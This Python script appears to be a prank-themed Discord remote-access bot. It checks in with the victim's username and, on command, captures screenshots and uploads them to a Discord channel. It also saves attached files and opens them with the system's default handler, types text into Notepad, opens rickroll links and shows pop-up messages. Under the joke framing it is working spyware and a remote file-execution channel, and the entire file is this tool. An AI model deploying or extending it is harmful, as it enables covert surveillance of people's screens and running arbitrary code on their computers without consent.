import subprocess
import sys
import os
import time
import webbrowser
import discord
from discord.ext import commands 
import pyautogui
import platform
import tkinter as tk
from tkinter import messagebox
import pygetwindow as gw


strid = ""

script_dir = os.path.dirname(os.path.abspath(__file__))
f_name = 'data.json'
requi = 'Screenshot.png'

i_mam = os.path.join(script_dir, requi)

print("START")

OOOtok = "Token goes here"
chnid = 0 #channel id goes here

try:
    user = os.getlogin()
except OSError:
    # Handle the case where os.getlogin() might not be available
    user = os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'

strid = user


intents = discord.Intents.all()

bot = commands.Bot(command_prefix="!", intents = discord.Intents.all())


@bot.event
async def on_ready():
    print("Running")
    channel = bot.get_channel(chnid)
    await channel.send(f"Operating: {strid}")

@bot.command(name='stop')
async def stop(ctx, *, name: str = None):
    if name == strid:
        sys.exit()
    elif name == "all":
        sys.exit()
    else:
        print("0")

@bot.command(name='test')
async def test(ctx, *, name: str = None):
    if name == strid:
        await ctx.send(f'DirRecive: {strid}')
    elif name == "all":
        await ctx.send(f"Recived: {strid}")
    else:
        print("0")

@bot.command(name='screen')
async def screen(ctx, *, name: str = None):
    if name == strid:
        if name == strid:
            print("K")
            pyautogui.screenshot(i_mam)

            we=0

            while we < 2:
                we += 1
                await ctx.send(content=f"dirscreen: {strid}", file=discord.File(i_mam))
        
                try:
                    # Delete the file
                    we += 1
                    os.remove(i_mam)
                except Exception as e:
                    print("ohno") 

    elif name == "all":
        if name == strid:
            print("K")
            pyautogui.screenshot(i_mam)

            we=0

            while we < 2:
                we += 1
                await ctx.send(content=f"screen:{strid}", file=discord.File(i_mam))
        
                try:
                    # Delete the file
                    we += 1
                    os.remove(i_mam)
                except Exception as e:
                    print("ohno") 

    else:
        print("0")


@bot.command(name='write')
async def write(ctx, *, name: str = None):
    if name == strid:
        subprocess.Popen("C:\\Windows\\System32\\notepad.exe")
        
        time.sleep(2)
        
        windows = gw.getWindowsWithTitle("Untitled - Notepad")
        if windows:
            notepad = windows[0]
            notepad.activate()  # Bring Notepad to the foreground
        else:
            await ctx.send("Failed to find Notepad window.")
            return

        pyautogui.write("Crazy? I was crazy once. They put me in a room. A rubber room. A rubber room with rats. They put me in a rubber room with rubber rats. Rubber rats? I hate rubber rats. They make me crazy.", interval=0.05)
        await ctx.send(f'dirwrite: {strid}')
    elif name == "all":
        subprocess.Popen("C:\\Windows\\System32\\notepad.exe")
        
        time.sleep(2)
        
        windows = gw.getWindowsWithTitle("Untitled - Notepad")
        if windows:
            notepad = windows[0]
            notepad.activate()  # Bring Notepad to the foreground
        else:
            await ctx.send("Failed to find Notepad window.")
            return

        pyautogui.write("Crazy? I was crazy once. They put me in a room. A rubber room. A rubber room with rats. They put me in a rubber room with rubber rats. Rubber rats? I hate rubber rats. They make me crazy.", interval=0.05)
        await ctx.send(f'write: {strid}')
    else:
        print("0")

@bot.command(name='rick')
async def rick(ctx, *, name: str = None):
    alturl = 'https://www.youtube.com/watch?v=p7YXXieghto'
    if name == strid:
        webbrowser.open(alturl)
        await ctx.send(f'Dirricked: {strid}!')
    elif name == "all":
        webbrowser.open(alturl)
        await ctx.send(f"ricked {strid}")
    else:
        print("0")

@bot.command(name='altrick')
async def altrick(ctx, *, name: str = None):
    alturl = 'https://youtube.com/clip/Ugkx6oaIXZKt-QhGWyxiwjIUQdK--u3zN-JE?si=y763XYFtXk04XQQ-'
    if name == strid:
        webbrowser.open(alturl)
        await ctx.send(f'Diraltricked: {strid}!')
    elif name == "all":
        webbrowser.open(alturl)
        await ctx.send(f"altricked {strid}")
    else:
        print("0")

@bot.command(name='dldimg')
async def dldimg(ctx, *, name: str = None):
    if name == strid:
        # Check if the message contains attachments
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            file_name = attachment.filename  # Get the name of the file

            # Download the file
            try:
                file_path = os.path.join('.', file_name) 
                await attachment.save(file_path)
                await ctx.send(f'Successfully downloaded {file_name}')

                if os.path.exists(file_path):
                    print(f'File exists: {file_path}')
                else:
                    print(f'File does not exist: {file_path}')

                # Optionally, send the file back to the channel
                
            
                print(file_path)

                if platform.system() == "Windows":
                    os.startfile(file_path)
                elif platform.system() == "Darwin":
                   subprocess.call(["open", file_path])
                else:
                    subprocess.call(["xdg-open", file_path])

                time.sleep(10)
                # Clean up the file
                os.remove(file_path)

                time.sleep(5)

                if os.path.exists(file_path):
                    print(f'File exists: {file_path}')
                else:
                    print(f'File does not exist: {file_path}')

                await ctx.send(f"dirdldimg: {strid}")

            except Exception as e:
                await ctx.send(f'Failed to download the file: {e}')
        else:
            await ctx.send('No file attached')

    elif name == "all":
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            file_name = attachment.filename  # Get the name of the file

            # Download the file
            try:
                file_path = os.path.join('.', file_name) 
                await attachment.save(file_path)
                await ctx.send(f'Successfully downloaded {file_name}')

                if os.path.exists(file_path):
                    print(f'File exists: {file_path}')
                else:
                    print(f'File does not exist: {file_path}')

                # Optionally, send the file back to the channel
                await ctx.send(file=discord.File(file_path))
            
                print(file_path)

                if platform.system() == "Windows":
                    os.startfile(file_path)
                elif platform.system() == "Darwin":
                   subprocess.call(["open", file_path])
                else:
                    subprocess.call(["xdg-open", file_path])

                time.sleep(10)
                # Clean up the file
                os.remove(file_path)

                time.sleep(5)

                if os.path.exists(file_path):
                    print(f'File exists: {file_path}')
                else:
                    print(f'File does not exist: {file_path}')

                await ctx.send(f"dldimg: {strid}")

            except Exception as e:
                await ctx.send(f'Failed to download the file: {e}')
        else:
            await ctx.send('No file attached')

    else:
        print("0")


@bot.command(name='prompt')
async def prompt(ctx, name: str = None, *, text: str = None):
    if name == strid:
        root = tk.Tk()
        root.withdraw()  # Hide the root window
    
    
        # Display a message box
        messagebox.showinfo("Important message", f"{text}")
        print("test")

        await ctx.send(f"dirprompt: {strid}")

    elif name == "all":
        root = tk.Tk()
        root.withdraw()  # Hide the root window
    
    
        # Display a message box
        messagebox.showinfo("Important message", f"{text}")
        print("test")

        await ctx.send(f"prompt: {strid}")

    else:
        print('0')

bot.run(OOOtok)
